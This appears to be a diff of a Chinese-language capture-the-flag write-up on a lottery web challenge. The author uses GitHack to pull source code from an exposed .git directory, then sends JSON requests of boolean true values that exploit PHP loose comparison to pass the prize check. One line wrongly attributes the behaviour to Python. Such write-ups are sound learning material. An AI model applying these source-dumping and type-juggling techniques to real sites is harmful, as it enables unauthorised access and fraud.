@@ -63,9 +63,9 @@
 
         不明白这个disallow里面的东西是什么意思，只好上网搜。
 
-    - 上网看了一下，明白了，需要用githack拿到/.git里面的东西，[githack](https://pypi.org/project/githack/)下载方法：
+- 上网看了一下，明白了，需要用githack拿到/.git里面的东西，[githack](https://pypi.org/project/githack/)下载方法：
 
-        `pip install githack`
+    - `pip install githack`
 
     - 下载之后运行，发现报错“无效目录名称”，尚未找到解决办法，明天解决。
 
@@ -74,7 +74,49 @@
     - 去李姐姐的git仓库里看issue，发现这个问题很早就有人提，但是始终没有人解决，只好暂时放弃李姐姐的。
 
     - 在git上搜索其他项目，下载了另一个star数较高的githack，仍然是python2的代码，又是一顿改，这次能跑了，而且也爬下了.git目录，但是跟.git同级的其它文件却爬不下来，报错信息 
-    
+        
         **“raise TypeError("Can't mix strings and bytes in path components") from None TypeError: Can't mix strings and bytes in path components”**
 
     上网查了一下，发现可能是字符串拼接的时候出了问题，但是即使我把拼接的各个参数全部强制转换成同一类型，仍然会报这个错误。
+
+    最后终于找到解决办法了，是系统环境的问题，应该在Linux上面跑的……
+
+- 成功运行GitHack, 拿到根目录下的 `api.php` 代码，立刻找它用来判断中奖数字个数的函数：
+
+    ```php
+        $win_numbers = random_win_nums();
+        $same_count = 0;
+        for($i=0; $i<7; $i++){
+            if($numbers[$i] == $win_numbers[$i]){
+                $same_count++;
+            }
+        }
+     ```
+
+- 分析这段话，说实话一开始我不知道要怎么绕过这个等式，后来上网查了别人的writeup才知道，python的 `==` 是有 “强弱类型比较” 之分的，如果两个比较的变量不是一个类型，也可以比，但是比较结果就不那么遵循我们的认知了。
+
+- [这里有一张比较真值表](https://www.php.net/manual/zh/types.comparisons.php)
+
+- 接下来我们就知道了，对照表看一下， `true` 与 `"字符串"` 比较时，结果恒为 `true` ，好，那我们就构造一个内含 `true` 的Json请求：
+
+    ```json
+    {"action":"buy","numbers":[true,true,true,true]}
+    ```
+    
+- 发现服务器回应：
+
+    ```json
+    {"status":"ok","numbers":[true,true,true,true],"win_numbers":"9363928","money":990,"prize":300}
+    ```
+
+    可以看到，对应的奖励是答对四个数字的奖励，即成功绕过了四个数字判断（因为我之前已经刷过一波钱了，所以金钱数量是从990开始的。）
+
+    一个true只绕过七个数字中的一个，那么我们想赢最多的钱就直接填七个true。
+
+- 构造json：
+
+    ```json
+    {"action":"buy","numbers":[true,true,true,true,true,true,true]}
+    ```
+    
+- 完成，数钱，买flag，舒服！
